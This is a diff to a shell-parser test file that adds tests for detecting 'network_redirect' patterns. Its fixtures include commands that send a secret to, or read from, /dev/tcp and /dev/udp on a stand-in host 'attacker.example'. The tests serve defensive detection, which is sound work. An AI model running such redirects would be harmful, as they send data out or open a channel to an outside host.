@@ -264,6 +264,42 @@ describe("Shell Parser", () => {
       });
     });
 
+    // network_redirect
+    describe("network_redirect", () => {
+      const hasNetworkRedirect = (result: {
+        dangerousPatterns: { type: string }[];
+      }) => result.dangerousPatterns.some((p) => p.type === "network_redirect");
+
+      test("detects output redirect to /dev/tcp", async () => {
+        const result = await parse(
+          "echo secret > /dev/tcp/attacker.example/80",
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects input redirect from /dev/tcp", async () => {
+        const result = await parse("cat < /dev/tcp/attacker.example/80");
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects read-write descriptor redirect to /dev/udp", async () => {
+        const result = await parse("exec 3<>/dev/udp/attacker.example/53");
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects a quoted /dev/tcp destination", async () => {
+        const result = await parse(
+          'echo secret > "/dev/tcp/attacker.example/80"',
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("ignores redirects to ordinary device files", async () => {
+        const result = await parse("echo noise > /dev/null");
+        expect(hasNetworkRedirect(result)).toBe(false);
+      });
+    });
+
     // sensitive_redirect
     describe("sensitive_redirect", () => {
       test("detects redirect to ~/.ssh/", async () => {
@@ -681,7 +717,7 @@ describe("Shell Parser", () => {
     test("parse-recovery in multi-stage pipeline marks ALL siblings synthetic", async () => {
       // The original bug repro from the iPhone screenshot.
       const cmd =
-        "cat /workspace/vellum-assistant-platform/web/src/app/(app)/admin/organizations/[id]/page.tsx | grep -A 30 -B 5 \"credit\\|Credit\" | head -80";
+        'cat /workspace/vellum-assistant-platform/web/src/app/(app)/admin/organizations/[id]/page.tsx | grep -A 30 -B 5 "credit\\|Credit" | head -80';
       const result = await parse(cmd);
       expect(result.segments.length).toBeGreaterThan(1);
       expect(result.segments.every((s) => s.synthetic === true)).toBe(true);
